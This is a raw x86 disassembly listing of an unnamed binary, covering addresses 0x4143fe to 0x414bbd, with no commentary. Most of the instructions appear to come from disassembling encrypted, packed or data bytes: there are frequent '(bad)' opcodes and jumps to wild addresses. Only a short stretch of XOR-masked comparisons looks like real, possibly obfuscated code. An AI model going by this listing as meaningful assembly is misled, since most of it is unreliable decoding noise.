  4143fe:	xchg   ecx,eax
  4143ff:	sbb    al,0x74
  414401:	js     0x4143d3
  414403:	ret    0x72ed
  414406:	xor    edi,DWORD PTR [edx-0xe4298f0]
  41440c:	icebp  
  41440d:	push   ds
  41440e:	cmp    dh,BYTE PTR [esp+ebp*1+0x7e84a991]
  414415:	xor    eax,0x59540287
  41441a:	fwait
  41441b:	jbe    0x41446d
  41441d:	inc    ebx
  41441e:	or     dl,bh
  414420:	inc    ebp
  414421:	or     eax,0xe9c9f99b
  414426:	pop    ss
  414427:	jecxz  0x414474
  414429:	outs   dx,BYTE PTR ds:[esi]
  41442a:	(bad)  
  41442b:	les    edi,FWORD PTR fs:[ecx+0xb]
  41442f:	scas   eax,DWORD PTR es:[edi]
  414430:	shl    DWORD PTR [ebx],1
  414432:	sbb    cl,BYTE PTR [edx+edx*4]
  414435:	icebp  
  414436:	dec    edi
  414437:	(bad)  
  414438:	mov    edi,0xd7ffdc31
  41443d:	out    0xc8,al
  41443f:	clc    
  414440:	pop    edx
  414441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414442:	pop    esp
  414443:	and    esi,edi
  414445:	int3   
  414446:	loope  0x414421
  414448:	add    al,0x54
  41444a:	fadd   DWORD PTR [ebx+0x7b7a6b8]
  414450:	clc    
  414451:	test   DWORD PTR [edx+0x15],edx
  414454:	jno    0x4143f4
  414456:	imul   ch
  414458:	inc    esp
  414459:	jbe    0x41449a
  41445b:	pusha  
  41445c:	mov    eax,ds:0x23ed5b3b
  414461:	retf   
  414462:	and    eax,0x905cc092
  414467:	mov    edx,?
  414469:	or     eax,0x9ae8171d
  41446e:	outs   dx,DWORD PTR ds:[esi]
  41446f:	stos   DWORD PTR es:[edi],eax
  414470:	dec    eax
  414471:	jmp    0xba72927b
  414476:	sub    al,0xae
  414478:	mov    ch,cl
  41447a:	fmul   DWORD PTR [ecx-0x14]
  41447d:	(bad)  
  41447e:	xchg   ebp,eax
  41447f:	dec    esi
  414480:	xchg   BYTE PTR [ebx],cl
  414482:	sub    eax,0xf1fbc869
  414487:	sub    al,0x77
  414489:	cdq    
  41448a:	(bad)  
  41448c:	jp     0x414468
  41448e:	mov    bl,0x2e
  414490:	pop    ds
  414491:	xor    al,0x5f
  414493:	or     cl,BYTE PTR [ebx]
  414495:	enter  0xc078,0xe5
  414499:	and    al,0x21
  41449b:	jl     0x414421
  41449d:	mov    bl,0x28
  41449f:	and    eax,0xf8151fc
  4144a4:	sub    BYTE PTR [eax-0x71],bl
  4144a7:	xchg   ebp,eax
  4144a8:	or     ebp,ecx
  4144aa:	ds push esp
  4144ac:	jle    0x414491
  4144ae:	sar    BYTE PTR [ebp-0x46],1
  4144b1:	scas   eax,DWORD PTR es:[edi]
  4144b2:	inc    esi
  4144b3:	jge    0x414453
  4144b5:	rcr    DWORD PTR [bx+di+0x906],0x96
  4144bb:	push   eax
  4144bc:	fmul   DWORD PTR [ecx+0x48]
  4144bf:	sbb    DWORD PTR [esi-0x63ffa0ca],edi
  4144c5:	cmp    al,0x7a
  4144c7:	cli    
  4144c8:	xchg   edi,eax
  4144c9:	inc    edi
  4144ca:	xchg   BYTE PTR [ebp+0x1a80b66c],al
  4144d0:	les    ebx,FWORD PTR [edi-0x60]
  4144d3:	push   0x5f448688
  4144d8:	adc    DWORD PTR [edi-0x4],esp
  4144db:	stos   BYTE PTR es:[edi],al
  4144dc:	jno    0x4144d2
  4144de:	out    dx,eax
  4144df:	adc    DWORD PTR [ebp+0x7a],0xffffffba
  4144e3:	dec    edx
  4144e4:	xor    DWORD PTR [edi+0x57],ebp
  4144e7:	mov    edi,0x31f30ea2
  4144ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144ed:	xchg   ebp,eax
  4144ee:	mov    esp,0xf728f2b1
  4144f3:	(bad)  
  4144f4:	jo     0x41453b
  4144f6:	mov    al,ds:0xa2e53678
  4144fb:	mov    ebp,0x3d08d275
  414500:	inc    ecx
  414501:	xor    BYTE PTR [ebx],0xb6
  414504:	cli    
  414505:	push   edx
  414506:	aaa    
  414507:	xor    eax,0x715f380e
  41450c:	push   edi
  41450d:	mov    DWORD PTR [ecx],ecx
  41450f:	retf   0x80c6
  414512:	and    eax,0x95e3fe68
  414517:	push   es
  414518:	fmul   QWORD PTR [ebx+0x5c]
  41451b:	jg     0x414563
  41451d:	cmp    bl,BYTE PTR [eax]
  41451f:	mov    ds:0xa30d924,eax
  414524:	or     BYTE PTR [edi-0x756ade07],ah
  41452a:	mov    bh,0x9d
  41452c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41452d:	(bad)  
  41452e:	sbb    eax,edi
  414530:	sub    bh,dh
  414532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414533:	repz xchg esi,eax
  414535:	sahf   
  414536:	mov    esp,0x42bc96d4
  41453b:	out    0x3b,al
  41453d:	js     0x41452e
  41453f:	les    esi,FWORD PTR [esi+0x8]
  414542:	sbb    al,0xd7
  414544:	aad    0xe3
  414546:	or     edi,DWORD PTR [edx+0x11]
  414549:	jmp    0x4b1627bc
  41454e:	xor    eax,0xaf3bd6f8
  414553:	sbb    ecx,eax
  414555:	call   0x7581d6be
  41455a:	mov    al,ds:0x7653d50a
  41455f:	les    eax,FWORD PTR [eax-0x1e]
  414562:	xor    DWORD PTR [edi-0x5c],ebx
  414565:	icebp  
  414566:	pop    es
  414567:	sbb    eax,0x560443ad
  41456c:	sti    
  41456d:	imul   eax,DWORD PTR [edi-0x3eca5f2e],0xc4f5f75a
  414577:	ins    BYTE PTR es:[edi],dx
  414578:	cmp    al,0xf5
  41457a:	lock push edx
  41457c:	and    al,0xa4
  41457e:	repnz stos DWORD PTR es:[edi],eax
  414580:	jb     0x4145b4
  414582:	shr    DWORD PTR [ecx],cl
  414584:	add    eax,0x24ac36b4
  414589:	dec    eax
  41458a:	mov    edi,0xe06fad38
  41458f:	add    esp,DWORD PTR [eax-0x5b192d4f]
  414595:	pop    DWORD PTR [ecx]
  414597:	(bad)
  41459a:	aad    0xef
  41459c:	or     ch,ch
  41459e:	dec    eax
  41459f:	mov    bl,0x12
  4145a1:	mov    ebp,0x32e58eca
  4145a6:	mov    dh,0x3a
  4145a8:	mov    al,0x0
  4145aa:	fadd   QWORD PTR [ecx+0x205becf3]
  4145b0:	aam    0xfb
  4145b2:	and    eax,esp
  4145b4:	int    0xcc
  4145b6:	xchg   BYTE PTR [ebp+ecx*2+0x493278ba],ah
  4145bd:	pop    es
  4145be:	lds    ebp,FWORD PTR [edx+esi*2-0x6fb2dacc]
  4145c5:	mov    WORD PTR [edi-0x18],?
  4145c8:	fidivr DWORD PTR [edi-0x5e]
  4145cb:	enter  0x641d,0xd3
  4145cf:	or     BYTE PTR [ecx+0x2b33dfc],bl
  4145d5:	(bad)  
  4145d6:	hlt    
  4145d7:	push   edi
  4145d8:	mov    al,0x32
  4145da:	or     dl,BYTE PTR [esp+eax*1]
  4145dd:	jb     0x4145fb
  4145df:	test   al,0xc1
  4145e1:	push   ss
  4145e2:	aad    0x4d
  4145e4:	and    ch,BYTE PTR [edx]
  4145e6:	push   cx
  4145e8:	inc    ecx
  4145e9:	sub    bh,BYTE PTR [ecx+0x10]
  4145ec:	mov    al,BYTE PTR [eax-0x1]
  4145ef:	dec    eax
  4145f0:	stc    
  4145f1:	adc    ebx,esi
  4145f3:	sub    ecx,DWORD PTR [eax+0x1e]
  4145f6:	ss xor eax,0x16632cc6
  4145fc:	xor    esp,edx
  4145fe:	mov    ds:0xe1096692,eax
  414603:	sbb    eax,edx
  414605:	loope  0x414669
  414607:	lds    ebx,FWORD PTR [esi+eax*1+0x2b0d34ab]
  41460e:	mov    BYTE PTR [esi],dh
  414610:	mov    dl,0xee
  414612:	push   ss
  414613:	das    
  414614:	xlat   BYTE PTR ds:[ebx]
  414615:	dec    esi
  414616:	shr    dh,1
  414618:	mov    ebp,0x2ef9a4df
  41461d:	aam    0x81
  41461f:	aas    
  414620:	cmp    ebx,DWORD PTR [edx-0x419dcbfe]
  414626:	clc    
  414627:	gs xchg esi,eax
  414629:	adc    ch,BYTE PTR [ecx]
  41462b:	add    dl,dh
  41462d:	and    ah,al
  41462f:	out    0x0,al
  414631:	aad    0x62
  414633:	mov    ch,0xa3
  414635:	imul   ecx,ebx,0x30
  414638:	jne    0x414635
  41463a:	sub    DWORD PTR [edx+0x59f87060],eax
  414640:	and    eax,DWORD PTR [eax]
  414642:	or     eax,0xff9fc8ae
  414647:	imul   edi
  414649:	das    
  41464a:	xchg   BYTE PTR [edi],dh
  41464c:	mov    cs,WORD PTR [esi]
  41464e:	add    edi,DWORD PTR ds:0x9d19b02c
  414654:	mov    ss,esp
  414656:	cs inc ebx
  414658:	cmp    DWORD PTR [ecx],ebx
  41465a:	pop    ebx
  41465b:	adc    al,0x8a
  41465e:	cmp    esi,0x65
  414661:	fld    QWORD PTR [ebx-0x52]
  414664:	(bad)  
  414665:	dec    edx
  414666:	or     DWORD PTR [esi-0x8cf78c],0xc74294fa
  414670:	dec    eax
  414671:	mov    cl,0xf3
  414673:	cli    
  414674:	cmp    bl,BYTE PTR [ebx-0x18]
  414677:	mov    esp,0x8721014c
  41467c:	jmp    0xbe37731c
  414681:	adc    DWORD PTR [edx+0x23],ebp
  414684:	mov    al,ds:0x11e59501
  414689:	or     DWORD PTR [ebp-0x18cf0b3],edi
  41468f:	std    
  414690:	(bad)  
  414691:	pop    ds
  414692:	test   DWORD PTR [eax-0x1b81e64a],0xe6f5670b
  41469c:	loope  0x4146d1
  41469e:	ins    BYTE PTR es:[edi],dx
  41469f:	pop    eax
  4146a0:	inc    ebp
  4146a1:	push   ebx
  4146a2:	add    al,0xb3
  4146a4:	ficomp WORD PTR [ebx]
  4146a6:	cmc    
  4146a7:	or     al,0xac
  4146a9:	cs jg  0x414676
  4146ac:	xchg   ebx,eax
  4146ad:	inc    ebx
  4146ae:	pop    edx
  4146af:	fld    DWORD PTR [ebx+0x778f8655]
  4146b5:	mov    esi,DWORD PTR [ecx]
  4146b7:	mov    edx,0x2c70c244
  4146bc:	es mov bh,0x1c
  4146bf:	dec    esi
  4146c0:	aam    0xb
  4146c2:	sub    al,0xf8
  4146c4:	imul   ebp,DWORD PTR [edx],0xffffffef
  4146c7:	inc    ecx
  4146c8:	cmp    esp,DWORD PTR [edi]
  4146ca:	jb     0x4146f7
  4146cc:	or     BYTE PTR [esi],bh
  4146ce:	lods   eax,DWORD PTR ds:[esi]
  4146cf:	add    eax,0xd2bab275
  4146d4:	bound  ebx,QWORD PTR [ecx+0x5b]
  4146d7:	mov    cl,0x37
  4146d9:	(bad)  
  4146da:	pusha  
  4146db:	mov    bh,BYTE PTR [esi]
  4146dd:	dec    edi
  4146de:	hlt    
  4146df:	push   ss
  4146e0:	push   edi
  4146e1:	ss push ss
  4146e3:	pop    edi
  4146e4:	pop    esp
  4146e5:	push   ecx
  4146e6:	jae    0x4146f3
  4146e8:	or     DWORD PTR [edx],esi
  4146ea:	jl     0x414768
  4146ec:	mov    DWORD PTR [edi+0x3c],esp
  4146ef:	aaa    
  4146f0:	outs   dx,DWORD PTR ds:[esi]
  4146f1:	int    0xec
  4146f3:	ins    BYTE PTR es:[edi],dx
  4146f4:	shl    cl,cl
  4146f6:	pusha  
  4146f7:	test   al,0xc9
  4146f9:	pushf  
  4146fa:	test   cl,dl
  4146fc:	loope  0x4146c2
  4146fe:	xchg   BYTE PTR [esi+0x34cbcdbb],dl
  414704:	inc    edx
  414705:	cwde   
  414706:	sahf   
  414707:	pop    edi
  414708:	loope  0x4146a1
  41470a:	sbb    eax,0x93d8f9f8
  41470f:	xchg   ecx,eax
  414710:	call   0xc29c:0xd0c6c02e
  414717:	retf   0x14e7
  41471a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41471b:	enter  0xf0c8,0x7a
  41471f:	and    esp,DWORD PTR [ecx]
  414721:	push   ebp
  414722:	daa    
  414723:	jle    0x414762
  414725:	lahf   
  414726:	neg    edi
  414728:	outs   dx,BYTE PTR ds:[esi]
  414729:	das    
  41472a:	mov    ch,0x85
  41472c:	imul   edi,DWORD PTR ds:0x66287b8c,0xb68af356
  414736:	xchg   ebx,eax
  414737:	jge    0x414783
  414739:	fsub   QWORD PTR [ebx]
  41473b:	cmp    bh,ah
  41473d:	pop    ds
  41473e:	fdivr  st(5),st
  414740:	loopne 0x41472a
  414742:	cmp    dl,BYTE PTR [edx-0x41]
  414745:	xchg   ebp,eax
  414746:	or     ecx,DWORD PTR gs:0x895e1ef6
  41474d:	sub    bh,0x13
  414750:	dec    eax
  414751:	fwait
  414752:	jns    0x4147a2
  414754:	int3   
  414755:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414757:	xor    ah,BYTE PTR [eax+eiz*4-0x25]
  41475b:	fwait
  41475c:	dec    ebp
  41475d:	fs loopne 0x4146e8
  414760:	dec    edi
  414761:	or     dh,ch
  414763:	out    dx,al
  414764:	adc    DWORD PTR [ebx],ecx
  414766:	fidivr DWORD PTR [ecx-0x2c]
  414769:	inc    ebp
  41476a:	cmc    
  41476b:	or     eax,0xc8d02161
  414770:	(bad)  [edi+ebx*1-0x1e]
  414774:	push   edx
  414775:	dec    edx
  414776:	rcr    DWORD PTR [edi+ebp*1],0x76
  41477a:	fmul   st,st(2)
  41477c:	mov    esp,0x4e52e2b5
  414781:	pushf  
  414782:	mov    eax,0xa23e4381
  414787:	nop
  414788:	(bad)
  41478c:	mov    ds:0xe484000a,eax
  414791:	and    eax,0x5e4afc44
  414796:	out    0x30,eax
  414798:	jg     0x41475a
  41479a:	scas   al,BYTE PTR es:[edi]
  41479b:	jl     0x41477d
  41479d:	inc    ecx
  41479e:	jle    0x414792
  4147a0:	scas   eax,DWORD PTR es:[di]
  4147a2:	mov    ch,0x1a
  4147a4:	movaps xmm4,xmm3
  4147a7:	xchg   DWORD PTR [eax],eax
  4147a9:	fisubr DWORD PTR [ebx+0x6b425090]
  4147af:	lahf   
  4147b0:	sbb    ecx,DWORD PTR [edi]
  4147b2:	sub    DWORD PTR [eax-0xae1a57],ebp
  4147b8:	stos   DWORD PTR es:[edi],eax
  4147b9:	hlt    
  4147ba:	jmp    0x4147d9
  4147bc:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4147be:	clc    
  4147bf:	sahf   
  4147c0:	js     0x4147a9
  4147c2:	pop    ebx
  4147c3:	into   
  4147c4:	repz scas al,BYTE PTR es:[edi]
  4147c6:	pop    ebx
  4147c7:	test   al,0x4d
  4147c9:	int    0xf7
  4147cb:	adc    dl,BYTE PTR [ebp-0x68]
  4147ce:	jno    0x4147b8
  4147d0:	cmovno ebp,DWORD PTR [ebx+esi*4+0x8]
  4147d5:	je     0x41484a
  4147d7:	or     dh,0x2a
  4147da:	jns    0x414809
  4147dc:	ds lahf 
  4147de:	mov    dh,0xde
  4147e0:	ror    DWORD PTR [edi+0x25ebba50],cl
  4147e6:	rcl    DWORD PTR ds:0x2eca3322,cl
  4147ec:	popa   
  4147ed:	fwait
  4147ee:	std    
  4147ef:	or     eax,0x3c9af44d
  4147f4:	ja     0x414872
  4147f6:	pop    esp
  4147f7:	adc    DWORD PTR [ebx-0x70],esi
  4147fa:	jl     0x414811
  4147fc:	push   es
  4147fd:	stc    
  4147fe:	jge    0x414781
  414800:	rcl    DWORD PTR [edx-0x4e],cl
  414803:	or     esi,DWORD PTR [edi]
  414805:	cmp    al,0xa7
  414807:	stos   DWORD PTR es:[edi],eax
  414808:	mov    ch,0xde
  41480a:	je     0x4147e3
  41480c:	mov    ?,WORD PTR cs:[edx-0x1e0fe024]
  414813:	and    BYTE PTR [eax+0x44],0xb7
  414817:	repnz data16 add BYTE PTR [edi+0xa5ae9eb],bh
  41481f:	(bad)  
  414820:	adc    eax,0x8eaf8a7
  414825:	pxor   mm5,QWORD PTR [edx-0x7235b22]
  41482c:	ds out 0x40,al
  41482f:	dec    eax
  414830:	ins    DWORD PTR es:[edi],dx
  414831:	(bad)  
  414833:	loop   0x41485d
  414835:	aad    0x30
  414837:	mov    ah,0xe9
  414839:	icebp  
  41483a:	pop    ebx
  41483b:	lods   eax,DWORD PTR ds:[esi]
  41483c:	sub    dl,BYTE PTR [eax+0x111c76f]
  414842:	sbb    BYTE PTR [esi+0x33],bh
  414845:	daa    
  414846:	mov    esp,0x7af3f7f4
  41484b:	mov    dh,0xf6
  41484d:	adc    al,0xbd
  41484f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414850:	repz pop edi
  414852:	aam    0x92
  414854:	(bad)  
  414855:	fmul   QWORD PTR [edi]
  414857:	sub    bh,BYTE PTR [ebx]
  414859:	cmp    edx,DWORD PTR [ebx]
  41485b:	jmp    0x785d2207
  414860:	inc    esp
  414861:	or     esp,DWORD PTR [ebp+0x47]
  414864:	jno    0x41489c
  414866:	fild   DWORD PTR [edi-0x1a8e20f5]
  41486c:	iret   
  41486d:	mov    WORD PTR [eax-0x9],cs
  414870:	cwde   
  414871:	pusha  
  414872:	shr    DWORD PTR [esi+edi*1],0xda
  414876:	(bad)  
  414877:	and    BYTE PTR [ebx],dh
  414879:	mov    WORD PTR [ecx+ebx*4-0x57],es
  41487d:	jo     0x4148df
  41487f:	imul   esi,DWORD PTR [eax],0x81225e33
  414885:	int3   
  414886:	xchg   ecx,eax
  414887:	cmp    edi,DWORD PTR [edx+0x1d]
  41488a:	mov    al,BYTE PTR [eax+0x25]
  41488d:	fdiv   DWORD PTR [esp+ebp*4-0x58]
  414891:	ss (bad) 
  414893:	mov    ebp,0xf71b9679
  414898:	sub    ah,BYTE PTR [eax]
  41489a:	pop    esp
  41489b:	es in  eax,dx
  41489d:	aas    
  41489e:	js     0x41483f
  4148a0:	adc    eax,0x415b97e4
  4148a5:	mov    eax,0xad53987f
  4148aa:	out    0x9e,al
  4148ac:	lods   al,BYTE PTR ds:[esi]
  4148ad:	in     eax,dx
  4148ae:	loope  0x41484d
  4148b0:	jbe    0x414848
  4148b2:	adc    DWORD PTR [ecx-0x42],ebp
  4148b5:	cmp    al,0x8a
  4148b7:	dec    ebp
  4148b8:	inc    DWORD PTR [eax+0x7e6d4529]
  4148be:	ins    BYTE PTR es:[edi],dx
  4148bf:	fisub  DWORD PTR [edx-0x15]
  4148c2:	icebp  
  4148c3:	stc    
  4148c4:	mov    ds:0xf6a9d29d,al
  4148c9:	add    al,0x6c
  4148cb:	mov    BYTE PTR [ecx+0x47d391c3],al
  4148d1:	cmp    DWORD PTR [edx-0x18],ecx
  4148d4:	or     DWORD PTR [eax+ecx*2+0x68b5d431],0x4f41548a
  4148df:	pop    eax
  4148e0:	or     esi,DWORD PTR [eax-0x7eff88ff]
  4148e6:	out    dx,eax
  4148e7:	or     BYTE PTR [ecx],al
  4148e9:	xchg   esp,eax
  4148ea:	push   ecx
  4148eb:	ins    DWORD PTR es:[edi],dx
  4148ec:	and    cl,al
  4148ee:	inc    ecx
  4148ef:	cmp    ebp,DWORD PTR [edx+0x3214ea55]
  4148f5:	push   eax
  4148f6:	xor    eax,0xe1404f0b
  4148fb:	fnsave [esi-0x3]
  4148fe:	push   0xffffff94
  414900:	sbb    al,0x6d
  414902:	dec    ebx
  414903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414904:	imul   eax,DWORD PTR [eax+edi*2+0xf],0xffffffd8
  414909:	xor    edi,DWORD PTR ds:[ebp-0x27]
  41490d:	dec    ebp
  41490e:	xor    edx,DWORD PTR [ebx-0x750baa75]
  414914:	xchg   esp,eax
  414915:	adc    eax,0xffffff64
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    ah,BYTE PTR [edi+0x1]
  414991:	mov    eax,0x7a944e62
  414996:	jnp    0x414949
  414998:	pushf  
  414999:	jnp    0x414a16
  41499b:	mov    ecx,0x2251db2a
  4149a0:	and    bh,BYTE PTR [ecx]
  4149a2:	or     cl,BYTE PTR [esi+ebp*2]
  4149a5:	sub    DWORD PTR [edx],esp
  4149a7:	stc    
  4149a8:	lahf   
  4149a9:	dec    ecx
  4149aa:	cdq    
  4149ab:	hlt    
  4149ac:	xchg   edi,eax
  4149ad:	sbb    eax,DWORD PTR [ecx+0x77]
  4149b0:	mov    al,0x95
  4149b2:	mov    ah,0x24
  4149b4:	cmp    al,0x57
  4149b6:	outs   dx,DWORD PTR ds:[esi]
  4149b7:	sbb    edx,ebp
  4149b9:	js     0x414a1e
  4149bb:	ins    BYTE PTR es:[edi],dx
  4149bc:	xchg   BYTE PTR [ebp-0x5c36a5b6],dl
  4149c2:	fwait
  4149c3:	std    
  4149c4:	test   eax,0x8dd77e83
  4149c9:	cmp    cl,0x9e
  4149cc:	iret   
  4149cd:	in     al,dx
  4149ce:	cli    
  4149cf:	sbb    BYTE PTR [edx+0x3cddc47e],0xf1
  4149d6:	mov    fs,WORD PTR fs:[ebx]
  4149d9:	(bad)  
  4149da:	repz mov dh,0x13
  4149dd:	cmp    BYTE PTR [edx-0x314fc277],ch
  4149e3:	push   ecx
  4149e4:	sahf   
  4149e5:	in     eax,0x36
  4149e7:	cmp    ch,BYTE PTR [edx]
  4149e9:	mov    edx,edx
  4149eb:	or     ah,BYTE PTR [edi+0x723e1603]
  4149f1:	jo     0x414a6b
  4149f3:	ins    DWORD PTR es:[edi],dx
  4149f4:	push   eax
  4149f5:	push   es
  4149f6:	stos   DWORD PTR es:[edi],eax
  4149f7:	mov    esp,0xe38e5168
  4149fc:	push   edx
  4149fd:	out    0x6e,eax
  4149ff:	je     0x4149af
  414a01:	xchg   ebp,edx
  414a03:	inc    ebp
  414a04:	pop    ecx
  414a05:	mov    cl,0x66
  414a07:	mov    ch,0xfe
  414a09:	sub    eax,0xfc95c77b
  414a0e:	es mov ecx,0x875ef7fb
  414a14:	sbb    al,BYTE PTR [eax+0x5763cb74]
  414a1a:	xor    BYTE PTR [edi],dh
  414a1c:	rcl    DWORD PTR [ebp-0x76],1
  414a1f:	cmp    cl,BYTE PTR [edx-0x5e32e4f5]
  414a25:	mov    ?,WORD PTR [ebp+ecx*4-0x1c]
  414a29:	fist   DWORD PTR [esi-0x7a]
  414a2c:	cmp    BYTE PTR [eax+0x38],cl
  414a2f:	cwde   
  414a30:	in     al,0x7d
  414a32:	adc    ecx,edx
  414a34:	dec    BYTE PTR [edi-0x25]
  414a37:	jb     0x4149f8
  414a39:	loope  0x414a55
  414a3b:	xchg   ebp,eax
  414a3c:	pop    ss
  414a3d:	hlt    
  414a3e:	cmp    al,0x32
  414a40:	xchg   esi,eax
  414a41:	fnstcw WORD PTR [esi-0x5b]
  414a44:	cmp    al,0xe8
  414a46:	dec    ebx
  414a47:	push   ds
  414a48:	mov    ah,0xbb
  414a4a:	inc    edi
  414a4b:	test   DWORD PTR [ebx+0x354ac0fc],ecx
  414a51:	add    ch,al
  414a53:	cmp    ebp,ebp
  414a55:	jno    0x414aac
  414a57:	cmp    eax,0xa7df208e
  414a5c:	jns    0x414a98
  414a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a5f:	retf   
  414a60:	fcmovnbe st,st(3)
  414a62:	or     bl,BYTE PTR [edi]
  414a64:	xchg   edx,eax
  414a65:	inc    ecx
  414a66:	lods   eax,DWORD PTR ds:[esi]
  414a67:	das    
  414a68:	out    0x43,al
  414a6a:	std    
  414a6b:	mov    BYTE PTR [edx-0x553dbbd1],bh
  414a71:	cli    
  414a72:	ret    
  414a73:	popa   
  414a74:	jbe    0x414ab8
  414a76:	pop    ebx
  414a77:	xchg   edi,eax
  414a78:	icebp  
  414a79:	ret    
  414a7a:	jg     0x414a0a
  414a7c:	sbb    ah,BYTE PTR [edi]
  414a7e:	stc    
  414a7f:	(bad)  
  414a80:	test   DWORD PTR cs:[eax],0x12747a5c
  414a87:	xchg   BYTE PTR [ebp+0x1f899cad],bl
  414a8d:	mov    edx,0xe86aaf89
  414a92:	push   0x3480cdab
  414a97:	mov    ebx,0xd0bc5dfb
  414a9c:	xor    al,0x31
  414a9e:	xchg   bl,dh
  414aa0:	out    dx,al
  414aa1:	inc    edi
  414aa2:	scas   al,BYTE PTR es:[edi]
  414aa3:	sti    
  414aa4:	shl    BYTE PTR ds:0xb705c08a,1
  414aaa:	add    BYTE PTR [ebp-0x7c3d1f74],0x93
  414ab1:	cmp    DWORD PTR [eax+0xc548098],eax
  414ab7:	mov    bh,0xab
  414ab9:	fwait
  414aba:	push   es
  414abb:	push   0x27ba0876
  414ac0:	rcl    BYTE PTR [esi+0x7627c171],0xa9
  414ac7:	out    dx,eax
  414ac8:	xchg   ecx,eax
  414ac9:	nop
  414aca:	fild   DWORD PTR [edx+edx*4+0x5b]
  414ace:	pushf  
  414acf:	and    al,0x6
  414ad1:	cmp    eax,0xf4d27b32
  414ad6:	out    0xfe,al
  414ad8:	pop    eax
  414ad9:	or     eax,0x112bbc8b
  414ade:	pop    eax
  414adf:	rol    bh,cl
  414ae1:	enter  0x4530,0x2f
  414ae5:	mov    ds:0x1cc3a143,al
  414aea:	rol    BYTE PTR [ebx],cl
  414aec:	inc    esi
  414aed:	shl    DWORD PTR ds:0xb6b968b9,0x9e
  414af4:	and    eax,0x4fb60422
  414af9:	outs   dx,DWORD PTR ds:[esi]
  414afa:	and    al,0x24
  414afc:	cld    
  414afd:	or     BYTE PTR [ebx-0x2af7ff87],al
  414b03:	adc    al,0x52
  414b05:	(bad)  
  414b06:	adc    BYTE PTR [esp+edx*2+0x4c],bh
  414b0a:	ret    
  414b0b:	cwde   
  414b0c:	sub    ah,dh
  414b0e:	sbb    al,0x9a
  414b10:	jns    0x414ac5
  414b12:	call   0xc1437137
  414b17:	sar    DWORD PTR [edx],1
  414b19:	out    dx,al
  414b1a:	push   0xa0049491
  414b1f:	cmp    al,0x44
  414b21:	jmp    0xe897f48b
  414b26:	fstp   TBYTE PTR [eax-0x5931a541]
  414b2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b2d:	pop    ds
  414b2e:	dec    esi
  414b2f:	out    dx,eax
  414b30:	not    BYTE PTR [edi]
  414b32:	sub    eax,DWORD PTR [ebx+0x1f4fa7df]
  414b38:	or     BYTE PTR [esp+ecx*2+0xd0965da],0x72
  414b40:	(bad)  
  414b41:	repz mov esi,0xffde2e5a
  414b47:	sbb    al,0xf7
  414b49:	pop    es
  414b4a:	xchg   ebp,eax
  414b4b:	cdq    
  414b4c:	jl     0x414b84
  414b4e:	dec    ebx
  414b4f:	scas   al,BYTE PTR es:[edi]
  414b50:	pop    edx
  414b51:	inc    ebp
  414b52:	loope  0x414aec
  414b54:	repnz lods al,BYTE PTR ds:[esi]
  414b56:	popa   
  414b57:	mov    bh,0x10
  414b59:	adc    al,0xb2
  414b5b:	icebp  
  414b5c:	cli    
  414b5d:	fidiv  WORD PTR [ebx+esi*2-0x5c257669]
  414b64:	pop    ds
  414b65:	lods   al,BYTE PTR ds:[esi]
  414b66:	cmp    edx,0x1c
  414b69:	jb     0x414b9f
  414b6b:	and    BYTE PTR [edx+0x39],dh
  414b6e:	fbld   TBYTE PTR [ebx+0x2]
  414b71:	in     al,0x9f
  414b73:	pop    edi
  414b74:	ret    0xfbeb
  414b77:	xchg   ebp,eax
  414b78:	cmc    
  414b79:	retf   
  414b7a:	loope  0x414b5c
  414b7c:	adc    DWORD PTR [edx-0xe681e83],ebp
  414b82:	push   ebx
  414b83:	jl     0x414b47
  414b85:	sub    DWORD PTR [edi+0x5b],edi
  414b88:	xchg   edx,eax
  414b89:	push   cs
  414b8a:	and    BYTE PTR [ebx+0x46],dl
  414b8d:	or     eax,0xbcb29341
  414b92:	in     eax,dx
  414b93:	ficomp DWORD PTR [edx-0x79]
  414b96:	xchg   ebp,eax
  414b97:	rcl    DWORD PTR [eax-0x59a5923d],cl
  414b9d:	inc    esp
  414b9e:	pop    eax
  414b9f:	sti    
  414ba0:	addr16 push 0x2e
  414ba3:	jmp    DWORD PTR [edx+0x3aeb790b]
  414ba9:	test   eax,0xea415482
  414bae:	clc    
  414baf:	test   DWORD PTR [ebx+0x62ece79c],esp
  414bb5:	dec    esi
  414bb6:	imul   esp,DWORD PTR [ebx+0x3e],0x883f6f9d
  414bbd:	dec    esi
